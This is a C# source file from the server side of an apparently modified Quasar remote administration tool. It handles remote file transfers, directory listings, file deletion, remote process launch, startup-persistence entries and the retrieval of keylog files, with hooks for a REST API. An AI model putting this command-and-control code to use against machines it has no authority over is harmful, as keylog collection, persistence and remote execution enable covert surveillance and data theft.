using Quasar.Common.Enums;
using Quasar.Common.IO;
using Quasar.Common.Logger;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using Quasar.Server.Enums;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using Quasar.Server.RestApiConstants;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;

namespace Quasar.Server.Messages
{
    public class FileTransferStatus
    {
        public const int STATUS_SUCCESS = 0;
        public const int STATUS_ERROR = 1;
        public const int STATUS_PENDING = 2;
        public const int STATUS_CANCELED = 3;
    }

    /// <summary>
    /// Handles messages for the interaction with remote files and directories.
    /// </summary>
    public class FileManagerHandler : MessageProcessorBase<string>, IDisposable
    {
        /// <summary>
        /// Represents the method that will handle drive changes.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="drives">All currently available drives.</param>
        public delegate void DrivesChangedEventHandler(object sender, Drive[] drives);

        /// <summary>
        /// Represents the method that will handle directory changes.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="remotePath">The remote path of the directory.</param>
        /// <param name="items">The directory content.</param>
        /// <param name="taskId">The task ID string for the associated task.</param>
        public delegate void DirectoryChangedEventHandler(object sender, string remotePath, FileSystemEntry[] items, string taskId);

        /// <summary>
        /// Represents the method that will handle file transfer updates.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="transfer">The updated file transfer.</param>
        public delegate void FileTransferUpdatedEventHandler(object sender, FileTransfer transfer);

        /// <summary>
        /// Raised when drives changed.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the 
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event DrivesChangedEventHandler DrivesChanged;

        /// <summary>
        /// Raised when a directory changed.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the 
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event DirectoryChangedEventHandler DirectoryChanged;

        /// <summary>
        /// Raised when a file transfer updated.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the 
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event FileTransferUpdatedEventHandler FileTransferUpdated;

        /// <summary>
        /// Reports changed remote drives.
        /// </summary>
        /// <param name="drives">The current remote drives.</param>
        private void OnDrivesChanged(Drive[] drives)
        {
            if (viaRestApi)
                return;
            SynchronizationContext.Post(d =>
            {
                var handler = DrivesChanged;
                handler?.Invoke(this, (Drive[])d);
            }, drives);
        }

        /// <summary>
        /// Reports a directory change.
        /// </summary>
        /// <param name="remotePath">The remote path of the directory.</param>
        /// <param name="items">The directory content.</param>
        private void OnDirectoryChanged(string remotePath, FileSystemEntry[] items, string taskId)
        {
            if (viaRestApi)
            {
                var handler = DirectoryChanged;
                handler?.Invoke(this, remotePath, items, taskId);
                return;
            }
            SynchronizationContext.Post(i =>
            {
                var handler = DirectoryChanged;
                handler?.Invoke(this, remotePath, (FileSystemEntry[])i, taskId);
            }, items);
        }

        /// <summary>
        /// Reports updated file transfers.
        /// </summary>
        /// <param name="transfer">The updated file transfer.</param>
        private void OnFileTransferUpdated(FileTransfer transfer)
        {
            if (viaRestApi)
            {
                var handler = FileTransferUpdated;
                handler?.Invoke(this, transfer);
                return;
            }
            SynchronizationContext.Post(t =>
            {
                var handler = FileTransferUpdated;
                handler?.Invoke(this, (FileTransfer)t);
            }, transfer.Clone());
        }

        /// <summary>
        /// Keeps track of all active file transfers. Finished or canceled transfers get removed.
        /// </summary>
        private readonly static List<FileTransfer> _activeFileTransfers = new List<FileTransfer>();

        /// <summary>
        /// Keeps track of all active and inactive file transfers.
        /// </summary>
        private readonly static Dictionary<int, FileTransfer> _fileTransferRegistry = new Dictionary<int, FileTransfer>();

        /// <summary>
        /// Keeps track of all uploaded files and their associated transfer IDs
        /// </summary>
        private readonly static Dictionary<int, string> _fileUploads = new Dictionary<int,string>();

        /// <summary>
        /// Maps file transfer IDs to associated task IDs
        /// </summary>
        private readonly static Dictionary<int, string> _fileTransferIdToTaskId = new Dictionary<int, string>();

        /// <summary>
        /// Used in lock statements to synchronize access between UI thread and thread pool.
        /// </summary>
        private readonly static object _syncLock = new object();

        /// <summary>
        /// The client which is associated with this file manager handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// Used to only allow two simultaneous file uploads.
        /// </summary>
        private readonly Semaphore _limitThreads = new Semaphore(2, 2);

        /// <summary>
        /// Path to the base download directory of the client.
        /// </summary>
        private readonly string _baseDownloadPath;

        private readonly TaskManagerHandler _taskManagerHandler;

        // Determines whether or not this file manager handler is for handling keylog file uploads
        private bool _keylogging;

        /// <summary>
        /// Initializes a new instance of the <see cref="FileManagerHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        /// <param name="subDirectory">Optional sub directory name.</param>
        /// <param name="viaRestApi">Indicates whether or not this FileManagerHandler will be used via the REST API.</param>
        /// <param name="baseUploadsDir">Indicates directory path to store uploaded files from clients.</param>
        public FileManagerHandler(
            Client client, 
            string subDirectory = "", 
            bool viaRestApi = false, 
            string baseUploadsDir = "", 
            bool keylogging = false
        ) : base(true, viaRestApi)
        {
            _client = client;
            _keylogging = keylogging;
            if (string.IsNullOrEmpty(baseUploadsDir))
            {
                _baseDownloadPath = Path.Combine(client.Value.DownloadDirectory, subDirectory);
            }
            else
            {
                _baseDownloadPath = Path.Combine(baseUploadsDir, subDirectory);
            }
            _taskManagerHandler = new TaskManagerHandler(client, viaRestApi);
            _taskManagerHandler.ProcessActionPerformed += ProcessActionPerformed;
            MessageHandler.Register(_taskManagerHandler);
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => (message is FileTransferChunk && ((FileTransferChunk)message).Keylogging == _keylogging) ||
                                                             (message is FileTransferCancel && ((FileTransferCancel)message).Keylogging == _keylogging) ||
                                                             (message is FileTransferComplete && ((FileTransferComplete)message).Keylogging == _keylogging) ||
                                                             message is GetDrivesResponse ||
                                                             (message is GetDirectoryResponse && ((GetDirectoryResponse)message).Keylogging == _keylogging) ||
                                                             message is SetStatusFileManager;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case FileTransferChunk file:
                    Execute(sender, file);
                    break;
                case FileTransferCancel cancel:
                    Execute(sender, cancel);
                    break;
                case FileTransferComplete complete:
                    Execute(sender, complete);
                    break;
                case GetDrivesResponse drive:
                    Execute(sender, drive);
                    break;
                case GetDirectoryResponse directory:
                    Execute(sender, directory);
                    break;
                case SetStatusFileManager status:
                    Execute(sender, status);
                    break;
            }
        }

        /// <summary>
        /// Begins downloading a file from the client.
        /// </summary>
        /// <param name="remotePath">The remote path of the file to download.</param>
        /// <param name="localFileName">The local file name.</param>
        /// <param name="overwrite">Overwrite the local file with the newly downloaded.</param>
        /// <param name="taskId">Associated task ID to link the file transfer to. Optional.</param>
        /// <returns>The file transfer id for the file transfer action, or -1 if given invalid parameters.</returns>
        public int BeginDownloadFile(string remotePath, string localFileName = "", bool overwrite = false, string taskId = "", bool keylogging = false)
        {
            if (string.IsNullOrEmpty(remotePath))
            {
                Logger.Error("BeginDownloadFile: Cannot begin client-to-server file transfer if no remote path is provided.");
                return -1;
            }
                
            int id = GetUniqueFileTransferId();
            Logger.Debug(String.Format("Generated new transfer ID {0} (task ID {2}) for file transfer from client to server. File: {1}.", id, remotePath, taskId));

            if (!Directory.Exists(_baseDownloadPath)) {
                Directory.CreateDirectory(_baseDownloadPath);
                Logger.Debug("BeginDownloadFile: Created new directory for file download from client: " + _baseDownloadPath);
            }
                
            string fileName = string.IsNullOrEmpty(localFileName) ? Path.GetFileName(remotePath) : localFileName;
            string localPath = Path.Combine(_baseDownloadPath, fileName);

            int i = 1;
            string tempPath = localPath;
            while (!overwrite && File.Exists(tempPath))
            {
                // rename file if it exists already
                var newFileName = string.Format("{0}({1}){2}", Path.GetFileNameWithoutExtension(localPath), i, Path.GetExtension(localPath));
                tempPath = Path.Combine(_baseDownloadPath, newFileName);
                i++;
            }
            if (tempPath != localPath)
                localPath = tempPath;
            Logger.Info(String.Format("Beginning server-to-client transfer {0} for file {1}.", id, remotePath));
            Logger.Info("Saving file on server as: " + localPath);

            var transfer = new FileTransfer
            {
                Id = id,
                Type = TransferType.Download,
                LocalPath = localPath,
                RemotePath = remotePath,
                Status = "Pending...",
                StatusCode = FileTransferStatus.STATUS_PENDING,
                //Size = fileSize, TODO: Add file size here
                TransferredSize = 0
            };

            try
            {
                transfer.FileSplit = new FileSplit(transfer.LocalPath, FileAccess.Write);
            }
            catch (Exception ex)
            {
                transfer.Status = "Error writing file";
                transfer.StatusCode = FileTransferStatus.STATUS_ERROR;
                lock (_syncLock)
                {
                    _fileTransferRegistry[transfer.Id] = transfer;
                }
                Logger.Error(String.Format("Client-to-server transfer {0} failed due to file write exception: {1}", id, ex.Message));
                OnFileTransferUpdated(transfer);
                return -1;
            }

            lock (_syncLock)
            {
                _activeFileTransfers.Add(transfer);
                _fileTransferRegistry[transfer.Id] = transfer;
                if (!String.IsNullOrEmpty(taskId))
                {
                    _fileTransferIdToTaskId[transfer.Id] = taskId;
                }
            }

            OnFileTransferUpdated(transfer);

            _client.Send(new FileTransferRequest {RemotePath = remotePath, Id = id, Keylogging = keylogging});

            return id;
        }

        /// <summary>
        /// Begins uploading a file to the client.
        /// </summary>
        /// <param name="localPath">The local path of the file to upload.</param>
        /// <param name="remotePath">Save the uploaded file to this remote path. If empty, generate a temporary file name.</param>
        /// <returns>The file transfer id for the file transfer action.</returns>
        public int BeginUploadFile(string localPath, string remotePath = "")
        {
            int id = GetUniqueFileTransferId();
            Logger.Debug(String.Format("Generated new transfer ID {0} for file transfer to client. File: {1}", id, localPath));
            FileTransfer transfer = new FileTransfer
            {
                Id = id,
                Type = TransferType.Upload,
                LocalPath = localPath,
                RemotePath = remotePath,
                Status = "Pending...",
                StatusCode = FileTransferStatus.STATUS_PENDING,
                TransferredSize = 0
            };

            try
            {
                transfer.FileSplit = new FileSplit(localPath, FileAccess.Read);
            }
            catch (Exception ex)
            {
                transfer.StatusCode = FileTransferStatus.STATUS_ERROR;
                transfer.Status = "Error reading file";
                lock (_syncLock)
                {
                    _fileTransferRegistry[transfer.Id] = transfer;
                }
                Logger.Error(String.Format("Server-to-client transfer {0} failed due to file read exception: {1}", id, ex.Message));
                OnFileTransferUpdated(transfer);
                return -1;
            }

            transfer.Size = transfer.FileSplit.FileSize;

            lock (_syncLock)
            {
                _activeFileTransfers.Add(transfer);
                _fileTransferRegistry[transfer.Id] = transfer;
            }

            transfer.Size = transfer.FileSplit.FileSize;

            new Thread(() =>
            {
                
                OnFileTransferUpdated(transfer);

                _limitThreads.WaitOne();
                try
                {
                    Logger.Info(String.Format("Beginning server-to-client transfer {0} for file {1}.", id, localPath));
                    foreach (var chunk in transfer.FileSplit)
                    {
                        transfer.TransferredSize += chunk.Data.Length;
                        decimal progress = transfer.Size == 0 ? 100 : Math.Round((decimal)((double)transfer.TransferredSize / (double)transfer.Size * 100.0), 2);
                        transfer.Status = $"Uploading...({progress}%)";
                        OnFileTransferUpdated(transfer);

                        bool transferCanceled;
                        lock (_syncLock)
                        {
                            transferCanceled = _activeFileTransfers.Count(f => f.Id == transfer.Id) == 0;
                        }

                        if (transferCanceled)
                        {
                            transfer.StatusCode= FileTransferStatus.STATUS_CANCELED;
                            transfer.Status = "Canceled";
                            OnFileTransferUpdated(transfer);
                            Logger.Info(String.Format("Server-to-client transfer {0} canceled.", id));
                            _limitThreads.Release();
                            return;
                        }

                        // TODO: blocking sending might not be required, needs further testing
                        _client.SendBlocking(new FileTransferChunk
                        {
                            Id = id,
                            Chunk = chunk,
                            FilePath = remotePath,
                            FileSize = transfer.Size
                        });
                    }
                }
                catch (Exception ex)
                {
                    Logger.Error(String.Format("Server-to-client transfer {0} failed due to exception: {1}", transfer.Id, ex.ToString()));
                    lock (_syncLock)
                    {
                        // if transfer is already cancelled, just return
                        if (_activeFileTransfers.Count(f => f.Id == transfer.Id) == 0)
                        {
                            _limitThreads.Release();
                            return;
                        }
                    }
                    transfer.StatusCode = FileTransferStatus.STATUS_ERROR;
                    transfer.Status = "Error reading file";
                    OnFileTransferUpdated(transfer);
                    CancelFileTransfer(transfer.Id);
                    _limitThreads.Release();
                    return;
                }

                _limitThreads.Release();
            }).Start();

            return id;
        }

        /// <summary>
        /// Cancels a file transfer.
        /// </summary>
        /// <param name="transferId">The id of the file transfer to cancel.</param>
        public void CancelFileTransfer(int transferId)
        {
            Logger.Debug(String.Format("Instructing client to cancel file transfer with ID {0}", transferId));
            _client.Send(new FileTransferCancel {Id = transferId});
        }

        /// <summary>
        /// Renames a remote file or directory.
        /// </summary>
        /// <param name="remotePath">The remote file or directory path to rename.</param>
        /// <param name="newPath">The new name of the remote file or directory path.</param>
        /// <param name="type">The type of the file (file or directory).</param>
        public void RenameFile(string remotePath, string newPath, FileType type)
        {
            _client.Send(new DoPathRename
            {
                Path = remotePath,
                NewPath = newPath,
                PathType = type
            });
        }

        /// <summary>
        /// Deletes a remote file or directory.
        /// </summary>
        /// <param name="remotePath">The remote file or directory path.</param>
        /// <param name="type">The type of the file (file or directory).</param>
        public void DeleteFile(string remotePath, FileType type)
        {
            _client.Send(new DoPathDelete {Path = remotePath, PathType = type});
        }

        /// <summary>
        /// Starts a new process remotely.
        /// </summary>
        /// <param name="remotePath">The remote path used for starting the new process.</param>
        public void StartProcess(string remotePath, string processArgs = "", bool useShellExecute = false, bool captureOutput = false, bool noWindow = false)
        {
            _taskManagerHandler.StartProcess(
                remotePath, 
                processArgs: processArgs, 
                useShellExecute: useShellExecute, 
                captureOutput: captureOutput,
                noWindow: noWindow
            );
        }

        /// <summary>
        /// Adds an item to the startup of the client.
        /// </summary>
        /// <param name="item">The startup item to add.</param>
        public void AddToStartup(StartupItem item)
        {
            _client.Send(new DoStartupItemAdd {StartupItem = item});
        }

        /// <summary>
        /// Gets the directory contents for the remote path.
        /// </summary>
        /// <param name="remotePath">The remote path of the directory.</param>
        public void GetDirectoryContents(string remotePath)
        {
            _client.Send(new GetDirectory {RemotePath = remotePath});
        }

        /// <summary>
        /// Refreshes the remote drives.
        /// </summary>
        public void RefreshDrives()
        {
            _client.Send(new GetDrives());
        }

        private void Execute(ISender client, FileTransferChunk message)
        {
            FileTransfer transfer;
            lock (_syncLock)
            {
                transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == message.Id);
            }

            if (transfer == null)
                return;

            transfer.Size = message.FileSize;
            transfer.TransferredSize += message.Chunk.Data.Length;

            try
            {
                transfer.FileSplit.WriteChunk(message.Chunk);
            }
            catch (Exception ex)
            {
                transfer.Status = "Error writing file";
                transfer.StatusCode = FileTransferStatus.STATUS_ERROR;
                Logger.Error(String.Format("Client-to-server transfer {0} failed due to exception: {1}", transfer.Id, ex.ToString()));
                OnFileTransferUpdated(transfer);
                CancelFileTransfer(transfer.Id);
                return;
            }

            decimal progress = transfer.Size == 0 ? 100 : Math.Round((decimal) ((double) transfer.TransferredSize / (double) transfer.Size * 100.0), 2);
            transfer.Status = $"Downloading...({progress}%)";

            OnFileTransferUpdated(transfer);
        }

        private void Execute(ISender client, FileTransferCancel message)
        {
            Logger.Debug("Received file transfer cancel message from client for transfer ID " + message.Id);
            FileTransfer transfer;
            lock (_syncLock)
            {
                transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == message.Id);
            }

            if (transfer != null)
            {
                Logger.Info(String.Format("Canceling file transfer {0} for reason: {1}", transfer.Id, message.Reason));
                transfer.Status = message.Reason;
                OnFileTransferUpdated(transfer);
                RemoveFileTransfer(transfer.Id, FileTransferStatus.STATUS_CANCELED);
                // don't keep un-finished files
                if (transfer.Type == TransferType.Download)
                {
                    Logger.Debug("Deleting partially downloaded file at " + transfer.LocalPath);
                    File.Delete(transfer.LocalPath);
                }
            }
            else
            {
                Logger.Error(String.Format("File transfer {0} not found.", message.Id));
            }
        }

        private void Execute(ISender client, FileTransferComplete message)
        {
            Logger.Debug("Received FileTransferComplete message from client for transfer ID " + message.Id);
            FileTransfer transfer;
            lock (_syncLock)
            {
                transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == message.Id);
            }

            if (transfer != null)
            {
                transfer.RemotePath = message.FilePath; // required for temporary file names generated on the client
                transfer.Status = "Completed";
                Logger.Info(String.Format("File transfer {0} complete.", transfer.Id));

                // If client-to-server file download, record uploaded file details
                if (transfer.Type == TransferType.Download) // Download transfer type means client to server (server downloads file)
                {
                    lock (_syncLock)
                    {
                        _fileUploads[transfer.Id] = transfer.LocalPath; // local path is the saved path on the server
                    }
                    Logger.Info(String.Format("Recorded file upload for transfer {0} at {1}", transfer.Id, transfer.LocalPath));
                }

                RemoveFileTransfer(transfer.Id, FileTransferStatus.STATUS_SUCCESS);
                OnFileTransferUpdated(transfer);
            }
            else
            {
                Logger.Error(String.Format("File transfer {0} not found.", message.Id));
            }
        }

        private void Execute(ISender client, GetDrivesResponse message)
        {
            if (message.Drives?.Length == 0)
                return;

            OnDrivesChanged(message.Drives);
        }
        
        private void Execute(ISender client, GetDirectoryResponse message)
        {
            Logger.Debug("Handling GetDirectoryResponse for task ID " + message.TaskId);
            if (message.Items == null)
            {
                message.Items = new FileSystemEntry[0];
            }
            OnDirectoryChanged(message.RemotePath, message.Items, message.TaskId);
        }

        private void Execute(ISender client, SetStatusFileManager message)
        {
            OnReport(message.Message);
        }

        private void ProcessActionPerformed(object sender, ProcessAction action, bool result)
        {
            if (action != ProcessAction.Start) return;
            OnReport(result ? "Process started successfully" : "Process failed to start");
        }

        /// <summary>
        /// Removes a file transfer given the transfer id.
        /// </summary>
        /// <param name="transferId">The file transfer id.</param>
        /// <param name="completionStatus">The file transfer status to assign the transfer.</param>
        private void RemoveFileTransfer(int transferId, int completionStatus)
        {
            lock (_syncLock)
            {
                if (_fileTransferRegistry.ContainsKey(transferId))
                {
                    _fileTransferRegistry[transferId].StatusCode = completionStatus;
                }
                var transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == transferId);
                transfer?.FileSplit?.Dispose();
                _activeFileTransfers.RemoveAll(s => s.Id == transferId);
            }
        }

        /// <summary>
        /// Generates a unique file transfer id.
        /// </summary>
        /// <returns>A unique file transfer id.</returns>
        private int GetUniqueFileTransferId()
        {
            int id;
            lock (_syncLock)
            {
                do
                {
                    id = FileTransfer.GetRandomTransferId();
                    // generate new id until we have a unique one
                } while (_activeFileTransfers.Any(f => f.Id == id) || _fileTransferRegistry.ContainsKey(id));
            }

            return id;
        }

        public static string GetTaskIdFromTransferId(int transferId)
        {
            lock (_syncLock)
            {
                if (_fileTransferIdToTaskId.ContainsKey(transferId))
                {
                    return _fileTransferIdToTaskId[transferId];
                }
                else
                {
                    return "";
                }
            }
        }

        // For unit testing.
        public static void DebugRegisterTransfer(FileTransfer transfer)
        {
            lock (_syncLock)
            {
                _fileTransferRegistry[transfer.Id] = transfer;
            }
        }

        // For unit testing.
        public static void DebugRegisterCompletedUpload(int transferId, string transferPath)
        {
            lock (_syncLock)
            {
                _fileUploads[transferId] = transferPath;
            }
        }

        public static void ClearCompletedUploadList()
        {
            lock (_syncLock)
            {
                _fileUploads.Clear();
            }
        }

        public static void ClearRegisteredTransfers()
        {
            lock (_syncLock)
            {
                _fileTransferRegistry.Clear();
            }
        }

        /*
         * API SUPPORT
         */

        /// <summary>
        /// Returns a copy of the uploaded file dictionary.
        /// </summary>
        public static Dictionary<int, string> GetUploadedFileListing()
        {
            lock (_syncLock)
            {
                return new Dictionary<int, string>(_fileUploads);
            }
        }

        /// <summary>
        /// Returns file path on Quasar Server of uploaded file belonging to the given transfer ID, or empty string if transfer ID doesn't exist.
        /// </summary>
        public static string GetUploadedFilePath(int transferId)
        {
            lock (_syncLock)
            {
                if (!_fileUploads.ContainsKey(transferId))
                {
                    return "";
                }
                return _fileUploads[transferId];
            }
        }

        public static bool TransferExists(int transferId)
        {
            lock (_syncLock)
            {
                return _fileTransferRegistry.ContainsKey(transferId);
            } 
        }

        private static Dictionary<string, object> ConvertTransferToDict(FileTransfer record)
        {
            return new Dictionary<string, object>
            {
                [RestConstants.TRANSFER_ID_FIELD] = record.Id,
                [RestConstants.TRANSFER_TYPE_FIELD] = record.Type == TransferType.Upload ? RestConstants.TRANSFER_TYPE_SERVER_TO_CLIENT : RestConstants.TRANSFER_TYPE_CLIENT_TO_SERVER,
                [RestConstants.TRANSFER_SIZE_FIELD] = record.Size,
                [RestConstants.TRANSFER_TRANSFERRED_SIZE_FIELD] = record.TransferredSize,
                [RestConstants.TRANSFER_LOCAL_PATH_FIELD] = record.LocalPath,
                [RestConstants.TRANSFER_REMOTE_PATH_FIELD] = record.RemotePath,
                [RestConstants.TRANSFER_STATUS_MSG_FIELD] = record.Status,
                [RestConstants.TRANSFER_STATUS_CODE_FIELD] = record.StatusCode
            };
        }

        public static Dictionary<string, object> GetFileTransferRecordDict(int transferId)
        {
            var ret = new Dictionary<string, object>();
            lock (_syncLock)
            {
                if (_fileTransferRegistry.ContainsKey(transferId))
                {
                    FileTransfer record = _fileTransferRegistry[transferId];
                    ret = ConvertTransferToDict(record);
                }
            }
            return ret;
        }

        public static List<Dictionary<string, object>> GetFileTransferRecordDictList()
        {
            var ret = new List<Dictionary<string, object>>();
            lock (_syncLock)
            {
                foreach (KeyValuePair<int, FileTransfer> entry in _fileTransferRegistry)
                {
                    ret.Add(ConvertTransferToDict(entry.Value));
                }
            }
            return ret;
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_syncLock)
                {
                    foreach (var transfer in _activeFileTransfers)
                    {
                        _client.Send(new FileTransferCancel {Id = transfer.Id});
                        transfer.FileSplit?.Dispose();
                        if (transfer.Type == TransferType.Download)
                            File.Delete(transfer.LocalPath);
                    }

                    _activeFileTransfers.Clear();
                    _fileTransferRegistry.Clear();
                }

                MessageHandler.Unregister(_taskManagerHandler);
                _taskManagerHandler.ProcessActionPerformed -= ProcessActionPerformed;
            }
        }
    }
}
